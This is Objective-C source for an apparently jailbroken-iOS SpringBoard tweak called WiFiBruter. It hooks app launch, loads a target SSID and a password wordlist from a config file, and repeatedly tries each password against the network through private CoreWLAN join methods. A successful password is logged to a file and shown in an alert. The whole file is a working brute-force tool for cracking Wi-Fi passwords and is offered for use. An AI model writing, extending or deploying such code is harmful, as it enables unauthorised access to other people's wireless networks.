#import <UIKit/UIKit.h>
#import <CoreWLAN/CWInterface.h>
#import <CoreWLAN/CWNetwork.h>
#import <Foundation/Foundation.h>

static NSString *const kConfigPath = @"/var/mobile/Library/WiFiBruter/config.plist";
static NSString *const kDefaultWordListPath = @"/var/mobile/Library/WiFiBruter/wordlist.txt";
static NSTimeInterval kMinDelay = 0.5;

@interface CWInterface (Private)
- (NSArray *)scanForNetworksWithName:(NSString *)ssid error:(NSError **)error;
- (BOOL)joinNetwork:(CWNetwork *)network withPassword:(NSString *)password error:(NSError **)error;
- (BOOL)associateToNetwork:(CWNetwork *)network password:(NSString *)password error:(NSError **)error;
- (NSString *)ssid;
@end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)application {
    %orig;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        [self runBruteForce];
    });
}
%end

@implementation SpringBoard (BruteForce)

- (NSDictionary *)loadConfig {
    NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:kConfigPath];
    if (!config) {
        config = @{};
    }
    return config;
}

- (NSArray *)loadPasswords {
    NSString *path = kDefaultWordListPath;
    NSDictionary *config = [self loadConfig];
    NSString *configured = [config objectForKey:@"WordListPath"];
    if (configured && configured.length > 0) {
        path = configured;
    }
    NSString *wordlist = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    if (!wordlist) {
        return @[];
    }
    NSArray *parts = [wordlist componentsSeparatedByCharactersInSet:[NSCharacterSet newlineAndWhitespaceCharacterSet]];
    NSMutableArray *passwords = [NSMutableArray array];
    for (NSString *p in parts) {
        if (p.length > 0) {
            [passwords addObject:p];
        }
    }
    return [passwords copy];
}

- (BOOL)isEnabled {
    NSDictionary *config = [self loadConfig];
    NSNumber *enabled = [config objectForKey:@"Enabled"];
    return [enabled boolValue];
}

- (NSString *)targetSSID {
    NSDictionary *config = [self loadConfig];
    NSString *ssid = [config objectForKey:@"TargetSSID"];
    if (!ssid || ssid.length == 0) {
        ssid = @"";
    }
    return ssid;
}

- (NSTimeInterval)delay {
    NSDictionary *config = [self loadConfig];
    NSNumber *d = [config objectForKey:@"DelayBetweenAttempts"];
    NSTimeInterval delay = [d doubleValue];
    if (delay < kMinDelay) {
        delay = kMinDelay;
    }
    return delay;
}

- (BOOL)joinWithPassword:(CWNetwork *)network password:(NSString *)password error:(NSError **)outError {
    CWInterface *iface = [CWInterface sharedInterface];
    BOOL ok = NO;
    if ([iface respondsToSelector:@selector(joinNetwork:withPassword:error:)]) {
        ok = [iface performSelector:@selector(joinNetwork:withPassword:error:) withObject:network withObject:password withObject:outError];
    }
    if (!ok && [iface respondsToSelector:@selector(associateToNetwork:password:error:)]) {
        ok = [iface performSelector:@selector(associateToNetwork:password:error:) withObject:network withObject:password withObject:outError];
    }
    return ok;
}

- (void)runBruteForce {
    if (![self isEnabled]) {
        return;
    }
    NSString *target = [self targetSSID];
    if (target.length == 0) {
        return;
    }
    NSArray *passwords = [self loadPasswords];
    if (passwords.count == 0) {
        return;
    }
    NSTimeInterval delay = [self delay];

    CWInterface *iface = [CWInterface sharedInterface];
    if (!iface) {
        return;
    }

    NSError *scanError = nil;
    NSArray *networks = [iface performSelector:@selector(scanForNetworksWithName:error:) withObject:target withObject:&scanError];
    if (!networks || networks.count == 0) {
        return;
    }

    for (CWNetwork *network in networks) {
        for (NSString *password in passwords) {
            NSError *joinError = nil;
            BOOL ok = [self joinWithPassword:network password:password error:&joinError];
            if (ok) {
                [self reportSuccess:target password:password];
                return;
            }
            if (delay > 0) {
                usleep((useconds_t)(delay * 1000000.0));
            }
        }
    }
}

- (void)reportSuccess:(NSString *)ssid password:(NSString *)password {
    NSString *message = [NSString stringWithFormat:@"WiFiBruter: cracked %@ -> %@", ssid, password];
    NSString *logPath = @"/var/mobile/Library/WiFiBruter/result.txt";
    [message writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"WiFiBruter"
                                                        message:message
                                                       delegate:nil
                                              cancelButtonTitle:@"OK"
                                              otherButtonTitles:nil];
        [alert show];
    });
}

@end
